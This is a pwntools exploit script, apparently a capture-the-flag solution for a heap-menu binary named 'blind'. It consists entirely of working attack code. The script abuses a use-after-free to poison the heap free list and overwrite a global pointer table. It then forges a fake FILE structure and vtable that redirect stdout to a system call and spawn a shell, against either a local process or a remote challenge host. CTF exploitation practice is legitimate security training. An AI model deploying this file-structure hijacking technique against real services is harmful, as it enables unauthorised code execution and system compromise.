from pwn import *
context.log_level = 'debug'

debug = 1
if debug:
	p = process('./blind')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote('106.75.20.44',9999)
	libc = ELF('./libc.so.6')
bss_addr = 0x602040-0x3
ptr_addr = 0x602060
sys_addr = 0x4008e3
stdout_addr =0x602020

 
def add(idx,content):
	p.sendlineafter("Choice:",'1')
	p.sendlineafter("Index:",str(idx))
	p.sendlineafter("Content:",content)
def change(idx,content):
	p.sendlineafter("Choice:",'2')
	#raw_input()
	p.sendlineafter("Index:",str(idx))
	p.sendafter("Content:",content)
def release(idx):
	p.sendlineafter("Choice:",'3')
	p.sendlineafter("Index:",str(idx))


add(0,'0gur1')
add(1,'1gur1')
release(0)
release(1)

change(1,p64(bss_addr)+'\n')
add(2,'2gur1')#2->1


payload = 'a'*(ptr_addr-bss_addr-16)
payload +=p64(stdout_addr)+p64(ptr_addr+0x100)+p64(ptr_addr+0x168)+p64(ptr_addr+0x1d0)+p64(ptr_addr+0x300)
#0->stdout #1->ptr+0x100 #2->ptr+0x168 #3->ptr+0x1d0 #4->ptr+0x300
add(3,payload)

file_struct = 'sh\x00\x00'+'\x00'*4+p64(0x602500)*3+p64(0x602600)*4+p64(0x602601)+p64(0)*4


change(1,file_struct)

file_struct =p64(0)*4+p64(0x602700)+p64(0)*8
change(2,file_struct)

file_struct = p64(0)+p64(ptr_addr+0x300)
change(3,file_struct+'\n')


vtable = p64(0xdeadbeef)*7+ p64(sys_addr)
change(4,vtable+'\n')

gdb.attach(p)
change(0,p64(ptr_addr+0x100)+'\n')

p.interactive()
